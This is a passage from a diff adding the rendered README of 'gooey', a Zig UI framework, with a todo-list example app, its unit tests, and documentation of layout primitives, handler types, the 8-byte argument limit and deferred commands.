+    index: usize,
+    done: bool,
+    label: []const u8,
+
+    pub fn render(self: @This(), cx: *Cx) void {
+        // A background + cross-axis centering means this is a \`box\` (with
+        // \`.direction = .row\`), not an \`hstack\` — stacks carry only gap/
+        // alignment/padding.
+        cx.render(ui.box(.{
+            .direction = .row,
+            .gap = 12,
+            .alignment = .{ .cross = .center },
+            .padding = .{ .all = 10 },
+            .background = ui.Color.white,
+            .corner_radius = 8,
+        }, .{
+            Checkbox{ .checked = self.done, .on_click_handler = cx.updateWith(self.index, AppState.toggle) },
+            ui.text(self.label, .{ .size = 16 }),
+            ui.spacer(),
+            Button{ .label = &#34;Delete&#34;, .variant = .danger, .size = .small, .on_click_handler = cx.updateWith(self.index, AppState.remove) },
+        }));
+    }
+};
+
+const FilterButton = struct {
+    label: []const u8,
+    filter: Filter,
+    active: bool,
+
+    pub fn render(self: @This(), cx: *Cx) void {
+        cx.render(Button{
+            .label = self.label,
+            .size = .small,
+            .variant = if (self.active) .primary else .secondary,
+            .on_click_handler = cx.updateWith(self.filter, AppState.setFilter),
+        });
+    }
+};
+
+// State is testable without UI.
+test &#34;remove keeps the list contiguous&#34; {
+    var s = AppState{};
+    s.pushTodo(&#34;a&#34;);
+    s.pushTodo(&#34;b&#34;);
+    s.pushTodo(&#34;c&#34;);
+    s.remove(1); // drop &#34;b&#34;
+    try std.testing.expectEqual(@as(usize, 2), s.count);
+    try std.testing.expectEqualStrings(&#34;a&#34;, s.todos[0].text());
+    try std.testing.expectEqualStrings(&#34;c&#34;, s.todos[1].text());
+}
+
+test &#34;remaining and clearCompleted&#34; {
+    var s = AppState{};
+    s.pushTodo(&#34;a&#34;);
+    s.pushTodo(&#34;b&#34;);
+    s.toggle(0);
+    try std.testing.expectEqual(@as(u32, 1), s.remaining());
+    s.clearCompleted();
+    try std.testing.expectEqual(@as(usize, 1), s.count);
+    try std.testing.expectEqualStrings(&#34;b&#34;, s.todos[0].text());
+}"><pre><span>const</span> <span>std</span> <span>=</span> <span>@import</span>(<span>&#34;std&#34;</span>);
+<span>const</span> <span>gooey</span> <span>=</span> <span>@import</span>(<span>&#34;gooey&#34;</span>);
+
+<span>const</span> <span>ui</span> <span>=</span> <span>gooey</span>.<span>ui</span>;
+<span>const</span> <span>Cx</span> <span>=</span> <span>gooey</span>.<span>Cx</span>;
+<span>const</span> <span>Button</span> <span>=</span> <span>gooey</span>.<span>components</span>.<span>Button</span>;
+<span>const</span> <span>Checkbox</span> <span>=</span> <span>gooey</span>.<span>components</span>.<span>Checkbox</span>;
+<span>const</span> <span>TextInput</span> <span>=</span> <span>gooey</span>.<span>components</span>.<span>TextInput</span>;
+
+<span>const</span> <span>MAX_TODOS</span> <span>=</span> <span>64</span>;
+<span>const</span> <span>TEXT_CAP</span> <span>=</span> <span>128</span>;
+<span>const</span> <span>draft_input_id</span> <span>=</span> <span>&#34;new-todo&#34;</span>;
+
+<span>// State is pure — no UI knowledge, fully testable.</span>
+<span>const</span> <span>Todo</span> <span>=</span> <span>struct</span> {
+    <span>buf</span>: [<span>TEXT_CAP</span>]<span>u8</span> <span>=</span> [<span>_</span>]<span>u8</span>{<span>0</span>} <span>**</span> <span>TEXT_CAP</span>,
+    <span>len</span>: <span>usize</span> <span>=</span> <span>0</span>,
+    <span>done</span>: <span>bool</span> <span>=</span> <span>false</span>,
+
+    <span>fn</span> <span>text</span>(<span>self</span>: <span>*</span><span>const</span> <span>Todo</span>) []<span>const</span> <span>u8</span> {
+        <span>return</span> <span>self</span>.<span>buf</span>[0<span>..</span><span>self</span>.<span>len</span>];
+    }
+};
+
+<span>const</span> <span>Filter</span> <span>=</span> <span>enum</span> { <span>all</span>, <span>active</span>, <span>done</span> };
+
+<span>const</span> <span>AppState</span> <span>=</span> <span>struct</span> {
+    <span>todos</span>: [<span>MAX_TODOS</span>]<span>Todo</span> <span>=</span> [<span>_</span>]<span>Todo</span>{.{}} <span>**</span> <span>MAX_TODOS</span>,
+    <span>count</span>: <span>usize</span> <span>=</span> <span>0</span>,
+    <span>draft</span>: []<span>const</span> <span>u8</span> <span>=</span> <span>&#34;&#34;</span>, <span>// two-way bound to the TextInput</span>
+    <span>filter</span>: <span>Filter</span> <span>=</span> <span>.all</span>,
+
+    <span>// Pure logic — what the tests below drive.</span>
+    <span>fn</span> <span>pushTodo</span>(<span>self</span>: <span>*</span><span>AppState</span>, <span>value</span>: []<span>const</span> <span>u8</span>) <span>void</span> {
+        <span>const</span> <span>trimmed</span> <span>=</span> <span>std</span>.<span>mem</span>.<span>trim</span>(<span>u8</span>, <span>value</span>, <span>&#34; <span>\\t</span><span>\\r</span><span>\\n</span>&#34;</span>);
+        <span>if</span> (<span>trimmed</span>.<span>len</span> <span>==</span> <span>0</span>) <span>return</span>;
+        <span>if</span> (<span>self</span>.<span>count</span> <span>&gt;=</span> <span>MAX_TODOS</span>) <span>return</span>;
+        <span>const</span> <span>slot</span> <span>=</span> <span>&amp;</span><span>self</span>.<span>todos</span>[<span>self</span>.<span>count</span>];
+        <span>const</span> <span>n</span> <span>=</span> <span>@min</span>(<span>trimmed</span>.<span>len</span>, <span>TEXT_CAP</span>);
+        <span>@memcpy</span>(<span>slot</span>.<span>buf</span>[0<span>..</span><span>n</span>], <span>trimmed</span>[0<span>..</span><span>n</span>]);
+        <span>slot</span>.<span>len</span> <span>=</span> <span>n</span>;
+        <span>slot</span>.<span>done</span> <span>=</span> <span>false</span>;
+        <span>self</span>.<span>count</span> <span>+=</span> <span>1</span>;
+    }
+
+    <span>pub</span> <span>fn</span> <span>toggle</span>(<span>self</span>: <span>*</span><span>AppState</span>, <span>index</span>: <span>usize</span>) <span>void</span> {
+        <span>if</span> (<span>index</span> <span>&gt;=</span> <span>self</span>.<span>count</span>) <span>return</span>;
+        <span>self</span>.<span>todos</span>[<span>index</span>].<span>done</span> <span>=</span> <span>!</span><span>self</span>.<span>todos</span>[<span>index</span>].<span>done</span>;
+    }
+
+    <span>pub</span> <span>fn</span> <span>remove</span>(<span>self</span>: <span>*</span><span>AppState</span>, <span>index</span>: <span>usize</span>) <span>void</span> {
+        <span>if</span> (<span>index</span> <span>&gt;=</span> <span>self</span>.<span>count</span>) <span>return</span>;
+        <span>var</span> <span>i</span> <span>=</span> <span>index</span>;
+        <span>while</span> (<span>i</span> <span>+</span> <span>1</span> <span>&lt;</span> <span>self</span>.<span>count</span>) : (<span>i</span> <span>+=</span> <span>1</span>) <span>self</span>.<span>todos</span>[<span>i</span>] <span>=</span> <span>self</span>.<span>todos</span>[<span>i</span> <span>+</span> <span>1</span>];
+        <span>self</span>.<span>count</span> <span>-=</span> <span>1</span>;
+    }
+
+    <span>pub</span> <span>fn</span> <span>setFilter</span>(<span>self</span>: <span>*</span><span>AppState</span>, <span>filter</span>: <span>Filter</span>) <span>void</span> {
+        <span>self</span>.<span>filter</span> <span>=</span> <span>filter</span>;
+    }
+
+    <span>pub</span> <span>fn</span> <span>clearCompleted</span>(<span>self</span>: <span>*</span><span>AppState</span>) <span>void</span> {
+        <span>var</span> <span>write</span>: <span>usize</span> <span>=</span> <span>0</span>;
+        <span>var</span> <span>read</span>: <span>usize</span> <span>=</span> <span>0</span>;
+        <span>while</span> (<span>read</span> <span>&lt;</span> <span>self</span>.<span>count</span>) : (<span>read</span> <span>+=</span> <span>1</span>) {
+            <span>if</span> (<span>!</span><span>self</span>.<span>todos</span>[<span>read</span>].<span>done</span>) {
+                <span>self</span>.<span>todos</span>[<span>write</span>] <span>=</span> <span>self</span>.<span>todos</span>[<span>read</span>];
+                <span>write</span> <span>+=</span> <span>1</span>;
+            }
+        }
+        <span>self</span>.<span>count</span> <span>=</span> <span>write</span>;
+    }
+
+    <span>fn</span> <span>remaining</span>(<span>self</span>: <span>*</span><span>const</span> <span>AppState</span>) <span>u32</span> {
+        <span>var</span> <span>n</span>: <span>u32</span> <span>=</span> <span>0</span>;
+        <span>for</span> (<span>self</span>.<span>todos</span>[0<span>..</span><span>self</span>.<span>count</span>]) <span>|</span><span>*</span><span>t</span><span>|</span> {
+            <span>if</span> (<span>!</span><span>t</span>.<span>done</span>) <span>n</span> <span>+=</span> <span>1</span>;
+        }
+        <span>return</span> <span>n</span>;
+    }
+
+    <span>fn</span> <span>visible</span>(<span>self</span>: <span>*</span><span>const</span> <span>AppState</span>, <span>t</span>: <span>*</span><span>const</span> <span>Todo</span>) <span>bool</span> {
+        <span>return</span> <span>switch</span> (<span>self</span>.<span>filter</span>) {
+            <span>.all</span> <span>=</span><span>&gt;</span> <span>true</span>,
+            <span>.active</span> <span>=</span><span>&gt;</span> <span>!</span><span>t</span>.<span>done</span>,
+            <span>.done</span> <span>=</span><span>&gt;</span> <span>t</span>.<span>done</span>,
+        };
+    }
+
+    <span>// Command — needs framework access (the binding only flows widget -&gt; state,</span>
+    <span>// so we reach the retained input widget to clear it after adding).</span>
+    <span>pub</span> <span>fn</span> <span>addTodo</span>(<span>self</span>: <span>*</span><span>AppState</span>, <span>g</span>: <span>*</span><span>gooey.Window</span>) <span>void</span> {
+        <span>self</span>.<span>pushTodo</span>(<span>self</span>.<span>draft</span>);
+        <span>self</span>.<span>draft</span> <span>=</span> <span>&#34;&#34;</span>;
+        <span>if</span> (<span>g</span>.<span>widgetState</span>(<span>gooey</span>.<span>widgets</span>.<span>TextInputState</span>, <span>draft_input_id</span>)) <span>|</span><span>input</span><span>|</span> {
+            <span>input</span>.<span>clear</span>();
+        }
+    }
+};
+
+<span>var</span> <span>state</span> <span>=</span> <span>AppState</span>{};
+
+<span>const</span> <span>App</span> <span>=</span> <span>gooey</span>.<span>App</span>(<span>AppState</span>, <span>&amp;</span><span>state</span>, <span>render</span>, .{
+    .<span>title</span> <span>=</span> <span>&#34;Todos&#34;</span>,
+    .<span>width</span> <span>=</span> <span>480</span>,
+    .<span>height</span> <span>=</span> <span>560</span>,
+});
+
+<span>comptime</span> {
+    <span>_</span> <span>=</span> <span>App</span>; <span>// Force analysis (also wires @export on WASM).</span>
+}
+
+<span>pub</span> <span>fn</span> <span>main</span>(<span>init</span>: <span>std.process.Init</span>) <span>!</span><span>void</span> {
+    <span>return</span> <span>App</span>.<span>main</span>(<span>init</span>);
+}
+
+<span>fn</span> <span>render</span>(<span>cx</span>: <span>*</span><span>Cx</span>) <span>void</span> {
+    <span>const</span> <span>s</span> <span>=</span> <span>cx</span>.<span>state</span>(<span>AppState</span>);
+    <span>const</span> <span>size</span> <span>=</span> <span>cx</span>.<span>windowSize</span>();
+
+    <span>cx</span>.<span>render</span>(<span>ui</span>.<span>box</span>(.{
+        .<span>width</span> <span>=</span> <span>size</span>.<span>width</span>,
+        .<span>height</span> <span>=</span> <span>size</span>.<span>height</span>,
+        .<span>direction</span> <span>=</span> <span>.column</span>,
+        .<span>padding</span> <span>=</span> .{ .<span>all</span> <span>=</span> <span>24</span> },
+        .<span>gap</span> <span>=</span> <span>16</span>,
+        .<span>background</span> <span>=</span> <span>ui</span>.<span>Color</span>.<span>rgb</span>(<span>0.96</span>, <span>0.96</span>, <span>0.97</span>),
+    }, .{
+        <span>ui</span>.<span>text</span>(<span>&#34;Todos&#34;</span>, .{ .<span>size</span> <span>=</span> <span>28</span> }),
+
+        <span>// Input row: TextInput binds to state.draft; Add is a command.</span>
+        <span>ui</span>.<span>hstack</span>(.{ .<span>gap</span> <span>=</span> <span>8</span>, .<span>alignment</span> <span>=</span> <span>.center</span> }, .{
+            <span>TextInput</span>{ .<span>id</span> <span>=</span> <span>draft_input_id</span>, .<span>placeholder</span> <span>=</span> <span>&#34;What needs doing?&#34;</span>, .<span>bind</span> <span>=</span> <span>&amp;</span><span>s</span>.<span>draft</span>, .<span>fill_width</span> <span>=</span> <span>true</span> },
+            <span>Button</span>{ .<span>label</span> <span>=</span> <span>&#34;Add&#34;</span>, .<span>on_click_handler</span> <span>=</span> <span>cx</span>.<span>command</span>(<span>AppState</span>.<span>addTodo</span>) },
+        }),
+
+        <span>// Filters: each button packs its enum value into the handler arg.</span>
+        <span>ui</span>.<span>hstack</span>(.{ .<span>gap</span> <span>=</span> <span>8</span> }, .{
+            <span>FilterButton</span>{ .<span>label</span> <span>=</span> <span>&#34;All&#34;</span>, .<span>filter</span> <span>=</span> <span>.all</span>, .<span>active</span> <span>=</span> <span>s</span>.<span>filter</span> <span>==</span> <span>.all</span> },
+            <span>FilterButton</span>{ .<span>label</span> <span>=</span> <span>&#34;Active&#34;</span>, .<span>filter</span> <span>=</span> <span>.active</span>, .<span>active</span> <span>=</span> <span>s</span>.<span>filter</span> <span>==</span> <span>.active</span> },
+            <span>FilterButton</span>{ .<span>label</span> <span>=</span> <span>&#34;Done&#34;</span>, .<span>filter</span> <span>=</span> <span>.done</span>, .<span>active</span> <span>=</span> <span>s</span>.<span>filter</span> <span>==</span> <span>.done</span> },
+        }),
+
+        <span>// The list, or an empty-state hint.</span>
+        <span>ui</span>.<span>when</span>(<span>s</span>.<span>count</span> <span>==</span> <span>0</span>, .{
+            <span>ui</span>.<span>text</span>(<span>&#34;Nothing yet — add your first todo above.&#34;</span>, .{ .<span>size</span> <span>=</span> <span>14</span> }),
+        }),
+        <span>TodoItems</span>{},
+
+        <span>ui</span>.<span>spacer</span>(),
+        <span>ui</span>.<span>hstack</span>(.{ .<span>gap</span> <span>=</span> <span>12</span>, .<span>alignment</span> <span>=</span> <span>.center</span> }, .{
+            <span>ui</span>.<span>textFmt</span>(<span>&#34;{d} left&#34;</span>, .{<span>s</span>.<span>remaining</span>()}, .{ .<span>size</span> <span>=</span> <span>14</span> }),
+            <span>ui</span>.<span>spacer</span>(),
+            <span>Button</span>{ .<span>label</span> <span>=</span> <span>&#34;Clear completed&#34;</span>, .<span>variant</span> <span>=</span> <span>.secondary</span>, .<span>size</span> <span>=</span> <span>.small</span>, .<span>on_click_handler</span> <span>=</span> <span>cx</span>.<span>update</span>(<span>AppState</span>.<span>clearCompleted</span>) },
+        }),
+    }));
+}
+
+<span>// Iteration lives in a component because each row needs \`cx\` for its handlers.</span>
+<span>const</span> <span>TodoItems</span> <span>=</span> <span>struct</span> {
+    <span>pub</span> <span>fn</span> <span>render</span>(<span>_</span>: <span>@This</span>(), <span>cx</span>: <span>*</span><span>Cx</span>) <span>void</span> {
+        <span>const</span> <span>s</span> <span>=</span> <span>cx</span>.<span>state</span>(<span>AppState</span>);
+        <span>for</span> (<span>s</span>.<span>todos</span>[0<span>..</span><span>s</span>.<span>count</span>], 0<span>..</span>) <span>|</span><span>*</span><span>todo</span>, <span>index</span><span>|</span> {
+            <span>if</span> (<span>!</span><span>s</span>.<span>visible</span>(<span>todo</span>)) <span>continue</span>;
+            <span>cx</span>.<span>render</span>(<span>TodoRow</span>{ .<span>index</span> <span>=</span> <span>index</span>, .<span>done</span> <span>=</span> <span>todo</span>.<span>done</span>, .<span>label</span> <span>=</span> <span>todo</span>.<span>text</span>() });
+        }
+    }
+};
+
+<span>const</span> <span>TodoRow</span> <span>=</span> <span>struct</span> {
+    <span>index</span>: <span>usize</span>,
+    <span>done</span>: <span>bool</span>,
+    <span>label</span>: []<span>const</span> <span>u8</span>,
+
+    <span>pub</span> <span>fn</span> <span>render</span>(<span>self</span>: <span>@This</span>(), <span>cx</span>: <span>*</span><span>Cx</span>) <span>void</span> {
+        <span>// A background + cross-axis centering means this is a \`box\` (with</span>
+        <span>// \`.direction = .row\`), not an \`hstack\` — stacks carry only gap/</span>
+        <span>// alignment/padding.</span>
+        <span>cx</span>.<span>render</span>(<span>ui</span>.<span>box</span>(.{
+            .<span>direction</span> <span>=</span> <span>.row</span>,
+            .<span>gap</span> <span>=</span> <span>12</span>,
+            .<span>alignment</span> <span>=</span> .{ .<span>cross</span> <span>=</span> <span>.center</span> },
+            .<span>padding</span> <span>=</span> .{ .<span>all</span> <span>=</span> <span>10</span> },
+            .<span>background</span> <span>=</span> <span>ui</span>.<span>Color</span>.<span>white</span>,
+            .<span>corner_radius</span> <span>=</span> <span>8</span>,
+        }, .{
+            <span>Checkbox</span>{ .<span>checked</span> <span>=</span> <span>self</span>.<span>done</span>, .<span>on_click_handler</span> <span>=</span> <span>cx</span>.<span>updateWith</span>(<span>self</span>.<span>index</span>, <span>AppState</span>.<span>toggle</span>) },
+            <span>ui</span>.<span>text</span>(<span>self</span>.<span>label</span>, .{ .<span>size</span> <span>=</span> <span>16</span> }),
+            <span>ui</span>.<span>spacer</span>(),
+            <span>Button</span>{ .<span>label</span> <span>=</span> <span>&#34;Delete&#34;</span>, .<span>variant</span> <span>=</span> <span>.danger</span>, .<span>size</span> <span>=</span> <span>.small</span>, .<span>on_click_handler</span> <span>=</span> <span>cx</span>.<span>updateWith</span>(<span>self</span>.<span>index</span>, <span>AppState</span>.<span>remove</span>) },
+        }));
+    }
+};
+
+<span>const</span> <span>FilterButton</span> <span>=</span> <span>struct</span> {
+    <span>label</span>: []<span>const</span> <span>u8</span>,
+    <span>filter</span>: <span>Filter</span>,
+    <span>active</span>: <span>bool</span>,
+
+    <span>pub</span> <span>fn</span> <span>render</span>(<span>self</span>: <span>@This</span>(), <span>cx</span>: <span>*</span><span>Cx</span>) <span>void</span> {
+        <span>cx</span>.<span>render</span>(<span>Button</span>{
+            .<span>label</span> <span>=</span> <span>self</span>.<span>label</span>,
+            .<span>size</span> <span>=</span> <span>.small</span>,
+            .<span>variant</span> <span>=</span> <span>if</span> (<span>self</span>.<span>active</span>) <span>.primary</span> <span>else</span> <span>.secondary</span>,
+            .<span>on_click_handler</span> <span>=</span> <span>cx</span>.<span>updateWith</span>(<span>self</span>.<span>filter</span>, <span>AppState</span>.<span>setFilter</span>),
+        });
+    }
+};
+
+<span>// State is testable without UI.</span>
+<span>test</span> <span>&#34;remove keeps the list contiguous&#34;</span> {
+    <span>var</span> <span>s</span> <span>=</span> <span>AppState</span>{};
+    <span>s</span>.<span>pushTodo</span>(<span>&#34;a&#34;</span>);
+    <span>s</span>.<span>pushTodo</span>(<span>&#34;b&#34;</span>);
+    <span>s</span>.<span>pushTodo</span>(<span>&#34;c&#34;</span>);
+    <span>s</span>.<span>remove</span>(<span>1</span>); <span>// drop &#34;b&#34;</span>
+    <span>try</span> <span>std</span>.<span>testing</span>.<span>expectEqual</span>(<span>@as</span>(<span>usize</span>, <span>2</span>), <span>s</span>.<span>count</span>);
+    <span>try</span> <span>std</span>.<span>testing</span>.<span>expectEqualStrings</span>(<span>&#34;a&#34;</span>, <span>s</span>.<span>todos</span>[<span>0</span>].<span>text</span>());
+    <span>try</span> <span>std</span>.<span>testing</span>.<span>expectEqualStrings</span>(<span>&#34;c&#34;</span>, <span>s</span>.<span>todos</span>[<span>1</span>].<span>text</span>());
+}
+
+<span>test</span> <span>&#34;remaining and clearCompleted&#34;</span> {
+    <span>var</span> <span>s</span> <span>=</span> <span>AppState</span>{};
+    <span>s</span>.<span>pushTodo</span>(<span>&#34;a&#34;</span>);
+    <span>s</span>.<span>pushTodo</span>(<span>&#34;b&#34;</span>);
+    <span>s</span>.<span>toggle</span>(<span>0</span>);
+    <span>try</span> <span>std</span>.<span>testing</span>.<span>expectEqual</span>(<span>@as</span>(<span>u32</span>, <span>1</span>), <span>s</span>.<span>remaining</span>());
+    <span>s</span>.<span>clearCompleted</span>();
+    <span>try</span> <span>std</span>.<span>testing</span>.<span>expectEqual</span>(<span>@as</span>(<span>usize</span>, <span>1</span>), <span>s</span>.<span>count</span>);
+    <span>try</span> <span>std</span>.<span>testing</span>.<span>expectEqualStrings</span>(<span>&#34;b&#34;</span>, <span>s</span>.<span>todos</span>[<span>0</span>].<span>text</span>());
+}</pre></div>
+<p dir="auto"><h2 tabindex="-1" dir="auto">API Pattern</h2><a aria-label="Permalink: API Pattern" href="#api-pattern" id="user-content-api-pattern"></a></p>
+<p dir="auto">Gooey separates concerns between <code>Cx</code> (context) and <code>ui</code> (layout primitives):</p>
+<markdown-accessiblity-table><table>
+<thead>
+<tr>
+<th>Module</th>
+<th>Purpose</th>
+<th>Examples</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>cx.*</code></td>
+<td>State, handlers, animations, focus</td>
+<td><code>cx.state()</code>, <code>cx.update()</code>, <code>cx.animate()</code>, <code>cx.changed()</code>, <code>cx.render()</code></td>
+</tr>
+<tr>
+<td><code>ui.*</code></td>
+<td>Layout containers and primitives</td>
+<td><code>ui.box()</code>, <code>ui.rect()</code>, <code>ui.hstack()</code>, <code>ui.vstack()</code>, <code>ui.text()</code>, <code>ui.when()</code></td>
+</tr>
+</tbody>
+</table></markdown-accessiblity-table>
+<div data-snippet-clipboard-copy-content="fn render(cx: *Cx) void {
+    const s = cx.state(AppState);
+
+    cx.render(ui.box(.{ .width = 100 }, .{
+        ui.text(&#34;Hello&#34;, .{}),
+
+        // Conditional rendering
+        ui.when(s.show_extra, .{
+            ui.text(&#34;Extra content&#34;, .{}),
+        }),
+
+        // Iterate over items
+        ui.each(&amp;s.items, struct {
+            fn render(item: Item, _: usize) @TypeOf(ui.text(&#34;&#34;, .{})) {
+                return ui.text(item.name, .{});
+            }
+        }.render),
+    }));
+}"><pre lang="/dev/null/example.zig#L1-19"><code>fn render(cx: *Cx) void {
+    const s = cx.state(AppState);
+
+    cx.render(ui.box(.{ .width = 100 }, .{
+        ui.text(&#34;Hello&#34;, .{}),
+
+        // Conditional rendering
+        ui.when(s.show_extra, .{
+            ui.text(&#34;Extra content&#34;, .{}),
+        }),
+
+        // Iterate over items
+        ui.each(&amp;s.items, struct {
+            fn render(item: Item, _: usize) @TypeOf(ui.text(&#34;&#34;, .{})) {
+                return ui.text(item.name, .{});
+            }
+        }.render),
+    }));
+}
+</code></pre></div>
+<p dir="auto"><strong>Key primitives:</strong></p>
+<ul dir="auto">
+<li><code>ui.box()</code> - Container with flexbox layout</li>
+<li><code>ui.rect()</code> - Childless box (dividers, spacers, colored blocks)</li>
+<li><code>ui.hstack()</code> / <code>ui.vstack()</code> - Horizontal/vertical stacks</li>
+<li><code>ui.text()</code> / <code>ui.textFmt()</code> - Text rendering</li>
+<li><code>ui.when(cond, children)</code> - Conditional rendering</li>
+<li><code>ui.maybe(optional, fn)</code> - Render if optional has value</li>
+<li><code>ui.each(items, fn)</code> - Render for each item</li>
+<li><code>ui.scroll(id, style, children)</code> - Scrollable container</li>
+<li><code>ui.spacer()</code> - Flexible space</li>
+</ul>
+<p dir="auto"><h2 tabindex="-1" dir="auto">Handler Types</h2><a aria-label="Permalink: Handler Types" href="#handler-types" id="user-content-handler-types"></a></p>
+<markdown-accessiblity-table><table>
+<thead>
+<tr>
+<th>Method</th>
+<th>Signature</th>
+<th>Use Case</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>cx.update()</code></td>
+<td><code>fn(*State) void</code></td>
+<td>Pure state mutations</td>
+</tr>
+<tr>
+<td><code>cx.updateWith()</code></td>
+<td><code>fn(*State, Arg) void</code></td>
+<td>Mutations with argument</td>
+</tr>
+<tr>
+<td><code>cx.command()</code></td>
+<td><code>fn(*State, *Gooey) void</code></td>
+<td>Framework access (focus, quit, entities)</td>
+</tr>
+<tr>
+<td><code>cx.commandWith()</code></td>
+<td><code>fn(*State, *Gooey, Arg) void</code></td>
+<td>Framework access with argument</td>
+</tr>
+<tr>
+<td><code>cx.defer()</code></td>
+<td><code>fn(*State, *Gooey) void</code></td>
+<td>Run after current event completes</td>
+</tr>
+<tr>
+<td><code>cx.deferWith()</code></td>
+<td><code>fn(*State, *Gooey, Arg) void</code></td>
+<td>Deferred with argument</td>
+</tr>
+</tbody>
+</table></markdown-accessiblity-table>
+<blockquote>
+<p dir="auto"><strong>Note:</strong> The state type is inferred automatically from the method pointer&#39;s first parameter — no need to pass it separately.</p>
+</blockquote>
+<p dir="auto"><h3 tabindex="-1" dir="auto">Handlers with Arguments</h3><a aria-label="Permalink: Handlers with Arguments" href="#handlers-with-arguments" id="user-content-handlers-with-arguments"></a></p>
+<p dir="auto">The <code>*With</code> variants (<code>updateWith</code>, <code>commandWith</code>, <code>deferWith</code>) let you pass data to your handler. The argument is captured at handler creation time and passed when invoked:</p>
+<div dir="auto" data-snippet-clipboard-copy-content="// In a list render callback - capture the index
+.on_click_handler = cx.updateWith(index, State.selectItem),
+
+// The handler receives the captured value
+pub fn selectItem(self: *State, index: u32) void {
+    self.selected = index;
+}"><pre><span>// In a list render callback - capture the index</span>
+.<span>on_click_handler</span> <span>=</span> <span>cx</span>.<span>updateWith</span>(<span>index</span>, <span>State</span>.<span>selectItem</span>),
+
+<span>// The handler receives the captured value</span>
+<span>pub</span> <span>fn</span> <span>selectItem</span>(<span>self</span>: <span>*</span><span>State</span>, <span>index</span>: <span>u32</span>) <span>void</span> {
+    <span>self</span>.<span>selected</span> <span>=</span> <span>index</span>;
+}</pre></div>
+<p dir="auto"><strong>The 8-byte limit:</strong> Arguments are packed into a <code>u64</code> for zero-allocation storage. This means your argument must be ≤8 bytes. If it exceeds this, you&#39;ll get a compile error:</p>
+<div data-snippet-clipboard-copy-content="error: updateWith: argument type &#39;MyLargeStruct&#39; exceeds 8 bytes. Use a pointer or index instead."><pre><code>error: updateWith: argument type &#39;MyLargeStruct&#39; exceeds 8 bytes. Use a pointer or index instead.
+</code></pre></div>
+<p dir="auto"><strong>What fits in 8 bytes:</strong></p>
+<markdown-accessiblity-table><table>
+<thead>
+<tr>
+<th>Type</th>
+<th>Size</th>
+<th>✓/✗</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>u8</code>, <code>i8</code>, <code>bool</code></td>
+<td>1 byte</td>
+<td>✓</td>
+</tr>
+<tr>
+<td><code>u16</code>, <code>i16</code></td>
+<td>2 bytes</td>
+<td>✓</td>
+</tr>
+<tr>
+<td><code>u32</code>, <code>i32</code>, <code>f32</code></td>
+<td>4 bytes</td>
+<td>✓</td>
+</tr>
+<tr>
+<td><code>u64</code>, <code>i64</code>, <code>f64</code></td>
+<td>8 bytes</td>
+<td>✓</td>
+</tr>
+<tr>
+<td><code>usize</code> (64-bit)</td>
+<td>8 bytes</td>
+<td>✓</td>
+</tr>
+<tr>
+<td><code>*T</code> (any pointer)</td>
+<td>8 bytes</td>
+<td>✓</td>
+</tr>
+<tr>
+<td><code>struct { x: u32, y: u32 }</code></td>
+<td>8 bytes</td>
+<td>✓</td>
+</tr>
+<tr>
+<td><code>[2]u32</code></td>
+<td>8 bytes</td>
+<td>✓</td>
+</tr>
+<tr>
+<td><code>struct { a: u32, b: u32, c: u32 }</code></td>
+<td>12 bytes</td>
+<td>✗</td>
+</tr>
+</tbody>
+</table></markdown-accessiblity-table>
+<p dir="auto"><strong>Workarounds for larger data:</strong></p>
+<div dir="auto" data-snippet-clipboard-copy-content="// Option 1: Use an index into your data
+.on_click_handler = cx.updateWith(row_index, State.selectRow),
+
+// Option 2: Use a pointer (if the data outlives the handler)
+.on_click_handler = cx.updateWith(&amp;self.items[i], State.editItem),
+
+// Option 3: Store data in state, pass an ID
+pub fn openFile(self: *State, file_id: u32) void {
+    const file = self.files.get(file_id) orelse return;
+    // ... use file.path, file.name, etc.
+}"><pre><span>// Option 1: Use an index into your data</span>
+.<span>on_click_handler</span> <span>=</span> <span>cx</span>.<span>updateWith</span>(<span>row_index</span>, <span>State</span>.<span>selectRow</span>),
+
+<span>// Option 2: Use a pointer (if the data outlives the handler)</span>
+.<span>on_click_handler</span> <span>=</span> <span>cx</span>.<span>updateWith</span>(<span>&amp;</span><span>self</span>.<span>items</span>[<span>i</span>], <span>State</span>.<span>editItem</span>),
+
+<span>// Option 3: Store data in state, pass an ID</span>
+<span>pub</span> <span>fn</span> <span>openFile</span>(<span>self</span>: <span>*</span><span>State</span>, <span>file_id</span>: <span>u32</span>) <span>void</span> {
+    <span>const</span> <span>file</span> <span>=</span> <span>self</span>.<span>files</span>.<span>get</span>(<span>file_id</span>) <span>orelse</span> <span>return</span>;
+    <span>// ... use file.path, file.name, etc.</span>
+}</pre></div>
+<p dir="auto"><h3 tabindex="-1" dir="auto">Deferred Commands</h3><a aria-label="Permalink: Deferred Commands" href="#deferred-commands" id="user-content-deferred-commands"></a></p>
+<p dir="auto">Use <code>defer</code> when you need to run code <strong>after</strong> the current event handler completes. This is essential for:</p>
+<ul dir="auto">
+<li><strong>Modal dialogs</strong> - They run their own event loop, which would deadlock if called during event handling</li>
+<li><strong>File pickers</strong> - Same reason as modals</li>
+<li><strong>Heavy operations</strong> - Defer work to avoid blocking the current frame</li>
+</ul>
+<div dir="auto" data-snippet-clipboard-copy-content="// In a command handler, use g.deferCommand():
+pub fn openFolder(self: *State, g: *Gooey) void {
+    _ = self;
+    g.deferCommand(State, State.openFolderDeferred);
+}
+
+fn openFolderDeferred(self: *State, g: *Gooey) void {
+    _ = g;
+    // Safe to open modal dialog here - we&#39;re outside event handling
+    const file_dialog = gooey.file_dialog;
+    if (file_dialog.promptForPaths(allocator, .{ .directories = true })) |result| {
+        defer result.deinit();
+        const path = result.paths[0];
+        self.loadDirectory(path);
+    }
+}
+
+// With an argument (same 8-byte limit applies):
+pub fn deleteItem(self: *State, g: *Gooey, index: u32) void {
+    _ = self;
+    g.deferCommandWith(State, u32, index, State.confirmDelete);
+}
+
+fn confirmDelete(self: *State, g: *Gooey, index: u32) void {
+    _ = g;
+    if (dialog.confirm(&#34;Delete item?&#34;)) {
+        self.items.remove(index);
+    }
+}"><pre><span>// In a command handler, use g.deferCommand():</span>
+<span>pub</span> <span>fn</span> <span>openFolder</span>(<span>self</span>: <span>*</span><span>State</span>, <span>g</span>: <span>*</span><span>Gooey</span>) <span>void</span> {
+    <span>_</span> <span>=</span> <span>self</span>;
+    <span>g</span>.<span>deferCommand</span>(<span>State</span>, <span>State</span>.<span>openFolderDeferred</span>);
+}
+
